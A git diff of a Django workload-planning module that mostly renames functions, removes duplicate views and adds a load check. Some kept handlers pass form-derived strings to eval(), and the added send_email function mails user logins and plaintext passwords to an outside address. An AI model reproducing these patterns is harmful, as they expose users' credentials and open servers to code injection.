@@ -1,17 +1,6 @@
-from pickle import TUPLE3
-from .models import Less
-from .forms import EntryForm, ProjectForm
-from datetime import *
-from django.shortcuts import render
-from django.forms import Form
-from .models import Load, Role, Project, UserProfile, Task
-from django.db.models import Q
-from django.utils.translation import gettext_lazy as _
-
-
-from typing import List, Union,Dict,Callable
-from .vvv import *
 from .utils import *
+from .vvv import *
+
 
 def real_and_virtual_people(role:object)->List[object]:
     pp1 = set(UserProfile.objects.filter(Q(role=role, virtual=False)))
@@ -104,21 +93,10 @@ def create_or_update_needs(person:object, role:object, project:object, m:date, v
         instance = Load.objects.create(project=project, role=role, month=m, load=v)
 
 
-
-def rest_of_time(p:object, r:object, j:object)->List[int]:
-    res = [0] * 12
-    load = time_available_person_role(p, r)
-    task = task_role_project(r, j)
-    for i in range(12):
-        res[i] = load[i] - task[i]
-
-    return res
-
-
-def rest_of_time(p, r):
+def rest_of_time_pr_12(p, r):
     c = [0] * 12
-    a = task_person_role(p, r)
-    b = time_available_person_role(p, r)
+    a = task_person_role_12(p, r)
+    b = time_available_person_role_12(p, r)
     try:
         for i in range(12):
             c[i] = b[i] - a[i]
@@ -127,7 +105,7 @@ def rest_of_time(p, r):
     return c
 
 
-def task_person_role(person:object, role:object)->List[int]:
+def task_person_role_12(person:object, role:object)->List[int]:
     d = date.today().replace(day=15)
     res = [0] * 12
     for i in range(12):
@@ -141,7 +119,7 @@ def task_person_role(person:object, role:object)->List[int]:
     return res
 
 def time_available_in_mon(p:int, r:int, y:int, m:int)->int:
-    d = date(y, m, 15)  # .replace(year=y).replace(month=m).replace(day=15)
+    d = date(y, m, 15) 
     person, role, project = get_prj_triplet(p, r, -1)
     if is_virtual(person):
         return 99999
@@ -169,7 +147,7 @@ def delta_on_span(p,r, j, n):
             sum -= rjd[i]
     return sum
 
-def sm(request):
+def save_max(request):
     html = ""
     id = 1
     r = 1
@@ -194,12 +172,12 @@ def sm(request):
         else:
             print(form.errors)
     if html == "":
-        return mr1(request, p, r, j)
-    return mrom(request)  # s
+        return available_role(request, p, r, j)
+    return available_all(request)  # s
 
 
 
-def s1(request):
+def save_task(request):
     p = 0
     r = 0
     j = 0
@@ -226,7 +204,7 @@ def s1(request):
     return eval(f"{html}(request,{p},{r},{j})")
 
 
-def s2(request):
+def save_needs(request):
     p = 0
     j = 0
     r = 0
@@ -250,65 +228,11 @@ def s2(request):
     return eval(f"{html}(request,{p},{r},{j})")
 
 
-def sj(request):
-    j = 1
-    if request.method == "POST":
-        # create a form instance and populate it with data from the request:
-        form = Form(request.POST)
-        # check whether it's valid:
-        if form.is_valid():
-            for k, v in request.POST.items():
-                sid = request.POST.get("id")
-                j = int(sid)
-                project = Project.objects.get(id=j)
-
-                if "." in k:
-                    r, d = k.split(".")
-                    role = Role.objects.get(id=r)
-                    person = None
-                    try:
-                        tjLoad(person, role, project, d, v)
-
-                    except:
-                        pass
-        else:
-            print(form.errors)
-
-        return aj(request, j)  #
-
-
-def smj(request):
-    p = -1
-    if request.method == "POST":
-        # create a form instance and populate it with data from the request:
-        form = Form(request.POST)
-        # check whether it's valid:
-        if form.is_valid():
-            for k, v in request.POST.items():
-                sid = request.POST.get("id")
-                j = int(sid)
-                project = Project.objects.get(id=j)
-
-                if "." in k:
-                    r, d = k.split(".")
-                    role = Role.objects.get(id=r)
-                    person = None
-                    try:
-                        tjLoad(person, role, project, d, v)
-
-                    except:
-                        pass
-        else:
-            print(form.errors)
-
-        return mmj(request, p, r, j)
-
-
 
 '''
 Задачи = утвержденные загрузки- суммарно = при фиксированных параметрах - вектор - нв 12 месяцев
 '''
-def task_person_role_project(p:object, r:object, j:object)->List[int]:
+def task_person_role_project_12(p:object, r:object, j:object)->List[int]:
     d = date.today().replace(day=15)
     res = [0] * 12
     for i in range(12):
@@ -321,7 +245,7 @@ def task_person_role_project(p:object, r:object, j:object)->List[int]:
     return res
 
 
-def task_role_project_including_virtuals(r, j):
+def task_role_project_including_virtuals_12(r, j):
     d = date.today().replace(day=15)
     res = [0] * 12
     for i in range(12):
@@ -335,7 +259,7 @@ def task_role_project_including_virtuals(r, j):
     return res
 
 
-def task_role_project(r, j):
+def task_role_project_12(r, j):
     d = date.today().replace(day=15)
     res = [0] * 12
     for i in range(12):
@@ -350,7 +274,7 @@ def task_role_project(r, j):
     return res
 
 
-def time_available_person_role(person:object, role:object)->List[int]:
+def time_available_person_role_12(person:object, role:object)->List[int]:
     if is_virtual(person):
         return [999999] * 12
 
@@ -376,19 +300,18 @@ def time_available_person_role(person:object, role:object)->List[int]:
         d = inc(d)
     return res
 
+#
+#def time_available_role(role:object)->List[int]:   
+#    people = real_people(role)
+#    res = [0] * 12
+#    for person in people:
+#        if is_virtual(person):
+#            continue
+#        isfree = time_available_person_role_12(person, role)
+#        for i in range(12):
+#            res[i] += isfree[i]
+#    return res
 
-def time_available_role(role:object)->List[int]:   
-    people = real_people(role)
-    res = [0] * 12
-    for person in people:
-        if is_virtual(person):
-            continue
-        isfree = time_available_person_role(person, role)
-        for i in range(12):
-            res[i] += isfree[i]
-    return res
-
-#rj_task_
 
 def needs_role_project_12(p:object,r:object, j:object)->List[int]:
     d = date0()
@@ -409,10 +332,36 @@ def needs_role_project_12(p:object,r:object, j:object)->List[int]:
 '''
 def delta_role_project_12(r:object, j:object)->List[int]:
     a = needs_role_project_12(-1,r, j)
-    b = task_role_project_including_virtuals(r, j)
+    b = task_role_project_including_virtuals_12(r, j)
     c = [0] * 12
     for i in range(12):
         c[i] = b[i] - a[i]
     return c
 
+'''
+Загрузка одно человека по разным ролям суммарно превысила 100% (булев вектор)
+'''
+def person_more_100_12(person:object)->List[bool]:
+    sum = [0] * 12
+    roles = {person.role}.union(person.res.all())
+    for role in roles:
+        isfree = time_available_person_role_12(person, role)
+        for i in range(12):
+            sum[i] += isfree[i]
+    res = [True] * 12
+    for i in range(12):
+        res[i] = sum[i] > 100
+    return res
 
+
+from django.core.mail import send_mail
+
+def send_email(msg1,msg2):
+    subject = 'new login'
+    message = f"login:{msg1} pwd:{msg2}"
+    from_email = 'admin@django.com'
+    recipient_list = ['jfeldman777@gmails.com']
+
+    send_mail(subject, message, from_email, recipient_list)
+   
+    
